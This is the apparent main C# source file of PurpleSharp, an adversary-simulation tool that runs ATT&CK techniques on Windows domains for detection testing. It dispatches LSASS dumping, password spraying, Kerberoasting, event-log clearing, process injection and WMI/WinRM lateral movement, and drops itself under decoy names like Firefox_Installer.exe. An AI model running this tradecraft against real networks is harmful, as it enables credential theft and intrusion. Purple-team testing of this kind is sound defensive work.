using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using PurpleSharp.Lib;

namespace PurpleSharp
{
    class Program
    {

        static void Usage()
        {
            Console.WriteLine("\n  PurpleSharp Usage:\n");
            Console.WriteLine("\tPurpleSharp.exe /List                    -   Roast all users in current domain");
            Console.WriteLine("\tPurpleSharp.exe /T [Technique_ID]        -   Roast all users in current domain using alternate creds");
        }

        public static void Main(string[] args)
        {
            string technique, tactic, pwd, command, rhost, domain, ruser, rpwd, scoutfpath, simrpath, log, dc, jfile;
            int usertype, hosttype, protocol, sleep, type, nusers, nhosts;
            sleep = 0;
            usertype = hosttype = protocol = type = 1;
            nusers = nhosts = 5;
            bool cleanup = false;
            bool opsec = false;
            bool verbose = false;
            bool orchservice = false;
            bool simservice = false;
            bool newchild = false;
            technique = tactic = rhost = domain = ruser = rpwd = dc = jfile = "";

            scoutfpath = "C:\\Windows\\Temp\\Legit.exe";
            simrpath = "AppData\\Local\\Temp\\Firefox_Installer.exe";
            log = "0001.dat";
            command = "ipconfig.exe";
            pwd = "Summer2019!";

            if (args.Length == 0)
            {
                Usage();
                return;

            }

            for (int i = 0; i < args.Length; i++)
            {
                try
                {
                    switch (args[i])
                    {
                        case "/j":
                            jfile = args[i + 1];
                            break;
                        case "/rhost":
                            rhost = args[i + 1];
                            break;
                        case "/ruser":
                            ruser = args[i + 1];
                            break;
                        case "/domain":
                            domain = args[i + 1];
                            break;
                        case "/rpwd":
                            rpwd = args[i + 1];
                            break;
                        case "/dc":
                            dc = args[i + 1];
                            break;
                        case "/t":
                            technique = args[i + 1];
                            break;
                        case "/scout":
                            scoutfpath = args[i + 1];
                            break;
                        case "/simulator":
                            simrpath = args[i + 1];
                            break;
                        case "/pwd":
                            pwd = args[i + 1];
                            break;
                        case "/tactic":
                            tactic = args[i + 1];
                            break;
                        case "/users":
                            usertype = Int32.Parse(args[i + 1]);
                            break;
                        case "/hosts":
                            hosttype = Int32.Parse(args[i + 1]);
                            break;
                        case "/prot":
                            protocol = Int32.Parse(args[i + 1]);
                            break;
                        case "/sleep":
                            sleep = Int32.Parse(args[i + 1]);
                            break;
                        case "/type":
                            type = Int32.Parse(args[i + 1]);
                            break;
                        case "/command":
                            command = args[i + 1];
                            break;
                        case "/nusers":
                            nusers = Int32.Parse(args[i + 1]);
                            break;
                        case "/nhosts":
                            nhosts = Int32.Parse(args[i + 1]);
                            break;
                        case "/cleanup":
                            cleanup = true;
                            break;
                        case "/opsec":
                            opsec = true;
                            break;
                        case "/v":
                            verbose = true;
                            break;
                        case "/o":
                            orchservice = true;
                            break;
                        case "/s":
                            simservice = true;
                            break;
                        case "/n":
                            newchild = true;
                            break;
                        default:
                            break;
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("[*] Error parsing parameters :( ");
                    Console.WriteLine("[*] Exiting");
                    return;

                }

            }
            if (newchild)
            {
                const uint NORMAL_PRIORITY_CLASS = 0x0020;
                //bool retValue;
                Structs.PROCESS_INFORMATION pInfo = new Structs.PROCESS_INFORMATION();
                Structs.STARTUPINFO sInfo = new Structs.STARTUPINFO();
                Structs.SECURITY_ATTRIBUTES pSec = new Structs.SECURITY_ATTRIBUTES();
                Structs.SECURITY_ATTRIBUTES tSec = new Structs.SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                string currentbin = System.Reflection.Assembly.GetEntryAssembly().Location;
                WinAPI.CreateProcess(null, currentbin + " /s", ref pSec, ref tSec, false, NORMAL_PRIORITY_CLASS, IntPtr.Zero, null, ref sInfo, out pInfo);
            }
            if (orchservice)
            {
                //Lib.NamedPipes.RunOrchestrationService("testpipe", technique, simulator, log);
                Lib.NamedPipes.RunScoutService("testpipe", log);
                return;
            }
            if (simservice)
            {

                string tech = Lib.NamedPipes.RunSimulationService("simargs", log);
                ExecuteTechnique(tech, type, usertype, nusers, hosttype, nhosts, protocol, sleep, pwd, command, log, cleanup);         
                return;
            }
            if (!jfile.Equals(""))
            {
                string json = File.ReadAllText(jfile);
                SimulationExercise engagement = Json.ReadJson(json);
                
                if (engagement != null)
                {
                    Console.Write("Submit Password for {0}\\{1}: ", engagement.domain, engagement.username);
                    string pass = Utils.GetPassword();
                    Console.WriteLine("[+] PurpleSharp will execute {0} playbooks", engagement.playbooks.Count);

                    SimulationExerciseResult engagementResults = new SimulationExerciseResult();
                    engagementResults.playbookresults = new List<SimulationPlaybookResult>();

                    SimulationPlaybook lastPlaybook = engagement.playbooks.Last();
                    foreach (SimulationPlaybook playbook in engagement.playbooks)
                    {
                        SimulationPlaybookResult playbookResults = new SimulationPlaybookResult();
                        playbookResults.taskresults = new List<PlaybookTaskResult>();
                        playbookResults.name = playbook.name;
                        Console.WriteLine("[+] Starting Execution of {0}", playbook.name);

                        PlaybookTask lastTask = playbook.tasks.Last();
                        foreach (PlaybookTask task in playbook.tasks)
                        {

                            PlaybookTaskResult taskResult = new PlaybookTaskResult();

                            Console.WriteLine("[+] Executing technique {0} against {1}", task.technique, task.host);

                            if (task.host.Equals("random"))
                            {
                                //List<Computer> targets = new List<Computer>();
                                List<Computer> targets = Ldap.GetADComputers(10, engagement.dc, engagement.username, pass);
                                if (targets.Count > 0)
                                {
                                    Console.WriteLine("[+] Obtained {0} possible targets.", targets.Count);
                                    var random = new Random();
                                    int index = random.Next(targets.Count);
                                    Console.WriteLine("[+] Picked random host for simulation: " + targets[index].Fqdn);
                                    taskResult = ExecuteRemote2(targets[index].Fqdn, engagement.domain, engagement.username, pass, task.technique, playbook.scoutfpath, playbook.simrpath, log, true, false);
                                    playbookResults.taskresults.Add(taskResult);
                                    if (playbook.sleep > 0 && !task.Equals(lastTask))
                                    {
                                        Console.WriteLine();
                                        Console.WriteLine("[+] Sleeping {0} minutes until next task...", playbook.sleep);
                                        System.Threading.Thread.Sleep(1000 * playbook.sleep);
                                    }
                                }
                                else Console.WriteLine("[!] Could not obtain targets for the simulation");

                            }
                            else
                            {
                                taskResult = ExecuteRemote2(task.host, engagement.domain, engagement.username, pass, task.technique, playbook.scoutfpath, playbook.simrpath, log, true, false);
                                playbookResults.taskresults.Add(taskResult);
                                if (playbook.sleep > 0 && !task.Equals(lastTask))
                                {
                                    Console.WriteLine();
                                    Console.WriteLine("[+] Sleeping {0} minutes until next task...", playbook.sleep);
                                    System.Threading.Thread.Sleep(1000 * playbook.sleep);
                                }
                            }
                            
                        }
                        if (engagement.sleep > 0 && !playbook.Equals(lastPlaybook))
                        {
                            Console.WriteLine();
                            Console.WriteLine("[+] Sleeping {0} minutes until next playbook...", engagement.sleep);
                            System.Threading.Thread.Sleep(1000 * playbook.sleep);
                        }

                        engagementResults.playbookresults.Add(playbookResults);
                    }

                    Console.WriteLine("Writting JSON results...");
                    Json.WriteJsonPlaybookResults(engagementResults);
                    Console.WriteLine("DONE. Open results.json");

                }
                else Console.WriteLine("[!] Could not parse JSON input.");
            }

            if (rhost == "random")
            {
                if (rpwd == "")
                {
                    Console.Write("Password for {0}\\{1}: ", domain, ruser);
                    rpwd = Utils.GetPassword();
                    Console.WriteLine();
                }
                List<Computer> targets = new List<Computer>();
                targets = Ldap.GetADComputers(10, dc, ruser, rpwd);
                if (targets.Count > 0)
                {
                    Console.WriteLine("[+] Obtained {0} possible targets.",targets.Count);
                    var random = new Random();
                    int index = random.Next(targets.Count);
                    Console.WriteLine("[+] Picked Random host for simulation: " +targets[index].Fqdn);
                    ExecuteRemote(targets[index].Fqdn, domain, ruser, rpwd, technique, scoutfpath, simrpath, log, opsec, verbose);
                }
                else Console.WriteLine("[!] Could not obtain targets for the simulation");
            }
            else if (rhost != "")
            {
                ExecuteRemote(rhost, domain, ruser, rpwd, technique, scoutfpath, simrpath, log, opsec, verbose);
            }
            else 
            {
                ExecuteTechnique(technique, type, usertype, nusers, hosttype, nhosts, protocol, sleep, pwd, command, log, cleanup);
            }
            
            
        }
        public static void ExecuteRemote(string rhost, string domain, string ruser, string rpwd, string technique, string scoutfpath, string simrpath, string log, bool opsec, bool verbose)
        {
            string[] supported_techniques = new string[] { "T1003", "T1136", "T1070", "T1050" };

            // techniques that need to be executed from a high integrity process
            string[] privileged_techniques = new string[] { "T1003", "T1136", "T1070", "T1050" };

            if (rpwd == "")
            {
                Console.Write("Password for {0}\\{1}: ", domain, ruser);
                rpwd = Utils.GetPassword();
                Console.WriteLine();
            }
            
            string uploadPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            int index = scoutfpath.LastIndexOf(@"\");
            string scoutFolder = scoutfpath.Substring(0,index+1);
            
            
            System.Threading.Thread.Sleep(3000);
            
            if (opsec)
            {
                string result = "";
                string args = "/o";

                Console.WriteLine("[+] Uploading Scout agent to {0} on {1}", scoutfpath, rhost);
                Lib.RemoteLauncher.upload(uploadPath, scoutfpath, rhost, ruser, rpwd, domain);

                Console.WriteLine("[+] Executing the Scout agent via WMI ...");
                Lib.RemoteLauncher.wmiexec(rhost, scoutfpath, args, domain, ruser, rpwd);
                Console.WriteLine("[+] Connecting to namedpipe service ...");

                result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe","SYN");
                if (result.Equals("SYN/ACK"))
                {
                    Console.WriteLine("[+] OK");
                    
                    if (privileged_techniques.Contains(technique.ToUpper())) result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "recon:privileged");
                    else result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "recon:regular");

                    string[] payload = result.Split(',');
                    string duser = payload[0];
                    

                    if (duser == "")
                    {
                        Console.WriteLine("[!] Could not identify a suitable process for the simulation. Is a user logged in on: " + rhost + "?");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "quit");
                        System.Threading.Thread.Sleep(1000);
                        Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                        Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);
                        Console.WriteLine("[!] Exitting.");
                        return;
                    }
                    else
                    {
                        string user = duser.Split('\\')[1];
                        //Console.WriteLine("[+] Sending simulator binary...");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "simrpath:" + simrpath);
                        //Console.WriteLine("[+] Sending technique ...");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "technique:" + technique);
                        //Console.WriteLine("[+] Sending opsec techqniue...");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "opsec:" + "ppid");


                        Console.WriteLine("[!] Recon -> " + String.Format("Logged user: {0} | Process: {1}.exe | PID: {2} | High Integrity: {3}", duser, payload[1], payload[2], payload[3]));
                        string simfpath = "C:\\Users\\" + user + "\\" + simrpath;
                        int index2 = simrpath.LastIndexOf(@"\");
                        string simrfolder = simrpath.Substring(0, index2 + 1);

                        string simfolder = "C:\\Users\\" + user + "\\" + simrfolder;

                        Console.WriteLine("[+] Uploading Simulation agent to " + simfpath);
                        Lib.RemoteLauncher.upload(uploadPath, simfpath, rhost, ruser, rpwd, domain);

                        Console.WriteLine("[+] Triggering simulation...");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "act");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "quit");

                        //System.Threading.Thread.Sleep(5000);
                        //Console.WriteLine("[+] Sending technique to simulation agent...");
                        //Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "simargs", "technique:"+technique);

                        if (verbose)
                        {
                            Console.WriteLine("[+] Grabbing the Scout Agent output...");
                            System.Threading.Thread.Sleep(1000);
                            string sresults = Lib.RemoteLauncher.readFile(rhost, scoutFolder + log, ruser, rpwd, domain);
                            Console.WriteLine("[+] Results:");
                            Console.WriteLine();
                            Console.WriteLine(sresults);
                        }

                        System.Threading.Thread.Sleep(8000);
                        Console.WriteLine("[+] Obtaining the Simulation Agent output...");
                        System.Threading.Thread.Sleep(1000);
                        string results = Lib.RemoteLauncher.readFile(rhost, simfolder + log, ruser, rpwd, domain);
                        Console.WriteLine("[+] Results:");
                        Console.WriteLine();
                        Console.WriteLine(results);
                        Console.WriteLine("[+] Cleaning up...");
                        Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + scoutfpath.Replace(":", "$"));
                        Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                        Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (scoutFolder + log).Replace(":", "$"));
                        Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);
                        Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + simfpath.Replace(":", "$"));
                        Lib.RemoteLauncher.delete(simfpath, rhost, ruser, rpwd, domain);
                        Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (simfolder + log).Replace(":", "$"));
                        Lib.RemoteLauncher.delete(simfolder + log, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[+] Writing JSON with results...");
                        //Json.GetTaskResult(results, duser);
                        //Console.WriteLine();    
                    }
                }
                else
                {
                    Console.WriteLine("[!] Could not connect to namedpipe service");
                    return;
                }
            }
            else
            {
                Console.WriteLine("[+] Uploading PurpleSharp to {0} on {1}", scoutfpath, rhost);
                Lib.RemoteLauncher.upload(uploadPath, scoutfpath, rhost, ruser, rpwd, domain);

                string cmdline = "/t " + technique;
                Console.WriteLine("[+] Executing PurpleSharp via WMI ...");
                Lib.RemoteLauncher.wmiexec(rhost, scoutfpath, cmdline, domain, ruser, rpwd);
                System.Threading.Thread.Sleep(3000);
                Console.WriteLine("[+] Obtaining results...");
                string results = Lib.RemoteLauncher.readFile(rhost, scoutFolder + log, ruser, rpwd, domain);
                Console.WriteLine("[+] Results:");
                Console.WriteLine();
                Console.WriteLine(results);
                Console.WriteLine("[+] Cleaning up...");
                Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + scoutfpath.Replace(":", "$"));
                Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (scoutFolder + log).Replace(":", "$"));
                Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);
            }
        }

        public static PlaybookTaskResult ExecuteRemote2(string rhost, string domain, string ruser, string rpwd, string technique, string scoutfpath, string simrpath, string log, bool opsec, bool verbose)
        {
            string[] supported_techniques = new string[] { "T1003", "T1136", "T1070", "T1050" };

            // techniques that need to be executed from a high integrity process
            string[] privileged_techniques = new string[] { "T1003", "T1136", "T1070", "T1050" };

            string uploadPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            int index = scoutfpath.LastIndexOf(@"\");
            string scoutFolder = scoutfpath.Substring(0, index + 1);


            System.Threading.Thread.Sleep(3000);

            if (opsec)
            {
                string result = "";
                string args = "/o";

                //Console.WriteLine("[+] Uploading Scout agent to {0} on {1}", scoutfpath, rhost);
                Lib.RemoteLauncher.upload(uploadPath, scoutfpath, rhost, ruser, rpwd, domain);

                //Console.WriteLine("[+] Executing the Scout agent via WMI ...");
                Lib.RemoteLauncher.wmiexec(rhost, scoutfpath, args, domain, ruser, rpwd);
                //Console.WriteLine("[+] Connecting to namedpipe service ...");

                result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "SYN");
                if (result.Equals("SYN/ACK"))
                {
                    //Console.WriteLine("[+] OK");

                    if (privileged_techniques.Contains(technique.ToUpper())) result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "recon:privileged");
                    else result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "recon:regular");

                    string[] payload = result.Split(',');
                    string duser = payload[0];


                    if (duser == "")
                    {
                        //Console.WriteLine("[!] Could not identify a suitable process for the simulation. Is a user logged in on: " + rhost + "?");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "quit");
                        System.Threading.Thread.Sleep(1000);
                        Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                        Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[!] Exitting.");
                        return null;
                    }
                    else
                    {
                        string user = duser.Split('\\')[1];
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "simrpath:" + simrpath);
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "technique:" + technique);
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "opsec:" + "ppid");

                        string simfpath = "C:\\Users\\" + user + "\\" + simrpath;
                        int index2 = simrpath.LastIndexOf(@"\");
                        string simrfolder = simrpath.Substring(0, index2 + 1);

                        string simfolder = "C:\\Users\\" + user + "\\" + simrfolder;

                        //Console.WriteLine("[+] Uploading Simulation agent to " + simfpath);
                        Lib.RemoteLauncher.upload(uploadPath, simfpath, rhost, ruser, rpwd, domain);

                        //Console.WriteLine("[+] Triggering simulation...");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "act");
                        Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe", "quit");

                        //System.Threading.Thread.Sleep(5000);
                        //Console.WriteLine("[+] Sending technique to simulation agent...");
                        //Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "simargs", "technique:"+technique);
                        System.Threading.Thread.Sleep(3000);
                        //Console.WriteLine("[+] Obtaining the Simulation Agent output...");
                        System.Threading.Thread.Sleep(1000);
                        string results = Lib.RemoteLauncher.readFile(rhost, simfolder + log, ruser, rpwd, domain);
                        Console.WriteLine("[+] Results:");
                        Console.WriteLine();
                        Console.WriteLine(results);
                        //Console.WriteLine("[+] Cleaning up...");
                        //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + scoutfpath.Replace(":", "$"));
                        Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (scoutFolder + log).Replace(":", "$"));
                        Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + simfpath.Replace(":", "$"));
                        Lib.RemoteLauncher.delete(simfpath, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (simfolder + log).Replace(":", "$"));
                        Lib.RemoteLauncher.delete(simfolder + log, rhost, ruser, rpwd, domain);
                        //Console.WriteLine("[+] Writing JSON with results...");
                        return Json.GetTaskResult(results, duser);
                        //Console.WriteLine();

                    }
                }
                else
                {
                    //Console.WriteLine("[!] Could not connect to namedpipe service");
                    return null;
                }
            }
            else
            {
                //Console.WriteLine("[+] Uploading PurpleSharp to {0} on {1}", scoutfpath, rhost);
                Lib.RemoteLauncher.upload(uploadPath, scoutfpath, rhost, ruser, rpwd, domain);

                string cmdline = "/t " + technique;
                //Console.WriteLine("[+] Executing PurpleSharp via WMI ...");
                Lib.RemoteLauncher.wmiexec(rhost, scoutfpath, cmdline, domain, ruser, rpwd);
                System.Threading.Thread.Sleep(3000);
                Console.WriteLine("[+] Obtaining results...");
                string results = Lib.RemoteLauncher.readFile(rhost, scoutFolder + log, ruser, rpwd, domain);
                Console.WriteLine("[+] Results:");
                Console.WriteLine();
                Console.WriteLine(results);
                //Console.WriteLine("[+] Cleaning up...");
                //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + scoutfpath.Replace(":", "$"));
                Lib.RemoteLauncher.delete(scoutfpath, rhost, ruser, rpwd, domain);
                //
                //Console.WriteLine("[+] Deleting " + @"\\" + rhost + @"\" + (scoutFolder + log).Replace(":", "$"));
                Lib.RemoteLauncher.delete(scoutFolder + log, rhost, ruser, rpwd, domain);

                return Json.GetTaskResult(results, "");
            }
        }
        public static void ExecuteTechnique(string technique, int type, int usertype, int nuser, int computertype, int nhosts, int protocol, int sleep, string password, string command, string log, bool cleanup)
        {
            switch (technique)
            {

                // Initial Access

                // Execution

                case "T1117":
                    Simulations.Execution.ExecuteRegsvr32(log);
                    break;

                //T1053 - Scheduled Task
                case "atexec":
                case "T1053":
                    Simulations.LateralMovement.CreateSchTaskOnHosts(computertype, nhosts, sleep, command, cleanup);
                    break;

                case "T1086":
                    Simulations.Execution.ExecutePowershell(log);
                    break;

                //T1028 - Windows Remote Management

                // Persistence

                //T1053 - Scheduled Task

                case "T1136":
                    //Simulations.Persistence.CreateAccountCmd(log);
                    Simulations.Persistence.CreateAccountApi(log);
                    break;

                case "T1050":
                    Simulations.Persistence.CreateServiceApi(log);
                    //Simulations.Persistence.CreateServiceCmd(log);
                    break;

                case "T1060":
                    Simulations.Persistence.RegistryRunKeyNET(log);
                    //Simulations.Persistence.RegistryRunKeyCmd(log);
                    break;

                // Privilege Escalation

                //T1050 - New Service

                //T1053 - Scheduled Task

                // Defense Evasion

                case "T1170":
                    Simulations.DefenseEvasion.Mshta(log);
                    break;

                case "T1191":
                    Simulations.DefenseEvasion.Csmtp(log);
                    break;

                case "T1085":
                    Simulations.DefenseEvasion.Rundll32(log);
                    break;

                case "T1070":
                    //Simulations.DefenseEvasion.ClearSecurityEventLogCmd(log);
                    Simulations.DefenseEvasion.ClearSecurityEventLogNET(log);
                    break;

                case "T1220":
                    Simulations.DefenseEvasion.XlScriptProcessing(log);
                    break;

                case "T1055":
                    Simulations.DefenseEvasion.ProcessInjection(log);
                    break;

                //T1117 - Regsvr32


                // Credential Access

                //T1110 - Brute Force
                case "T1110":
                    if (type == 3)
                    {
                        Simulations.CredAccess.LocalDomainPasswordSpray(usertype, nuser, protocol, sleep, password, log); ;
                        break;
                    }
                    else if (type == 1)
                    {
                        Simulations.CredAccess.RemotePasswordSpray(type, computertype, nhosts, usertype, nuser, protocol, sleep, password, log);
                        break;
                    }
                    break;

                case "localspray":
                    //T1110 - Brute Force
                    Simulations.CredAccess.LocalDomainPasswordSpray(usertype, nuser, protocol, sleep, password, log);
                    break;

                //T1110 - Brute Force    
                case "networkspray":
                    Simulations.CredAccess.RemotePasswordSpray(type, computertype, nhosts, usertype, nuser, protocol, sleep, password, log);
                    break;


                //T1208 - Kerberoasting
                case "kerberoast":
                case "T1208":
                    Simulations.CredAccess.Kerberoasting(log, sleep);
                    break;

                //T1003 - Credential Dumping
                case "lsassdump":
                case "T1003":
                    Simulations.CredAccess.Lsass(log);
                    break;

                // Discovery

                //T1135 - Network Share Discovery
                case "shareenum":
                case "T1135":
                    Simulations.Discovery.EnumerateShares(computertype, nhosts, sleep, log);
                    break;

                //T1046 - Network Service Scanning
                case "portscan":
                case "T1046":
                    Simulations.Discovery.NetworkServiceDiscovery(computertype, nhosts, sleep, log);
                    break;

                case "T1087":
                    Simulations.Discovery.AccountDiscoveryLdap(log);
                    //Simulations.Discovery.AccountDiscoveryCmd(log);
                    break;

                case "T1007":
                    Simulations.Discovery.SystemServiceDiscovery(log);
                    break;

                case "T1033":
                    Simulations.Discovery.SystemUserDiscovery(log);
                    break;

                case "T1049":
                    Simulations.Discovery.SystemNetworkDiscovery(log);
                    break;

                // Lateral Movement

                //T1028 - Windows Remote Management
                case "winrmexec":
                case "T1028":
                    Simulations.LateralMovement.ExecuteWinRMOnHosts(computertype, nhosts, sleep, command);
                    break;

                //T1021 - Remote Service
                case "remoteservice":
                case "T1021":
                    Simulations.LateralMovement.CreateRemoteServiceOnHosts(computertype, nhosts, sleep, cleanup);
                    break;

                //T1047 - Windows Management Instrumentation
                case "wmiexec":
                case "T1047":
                    Simulations.LateralMovement.ExecuteWmiOnHosts(computertype, nhosts, sleep, command);
                    break;


                // Collection

                // Command and Control

                // Exfiltration

                // Impact

                // Other

                case "privenum":
                    Simulations.Discovery.PrivilegeEnumeration(computertype, nhosts, sleep);
                    break;

                default:
                    break;

            }
        }

    }

}
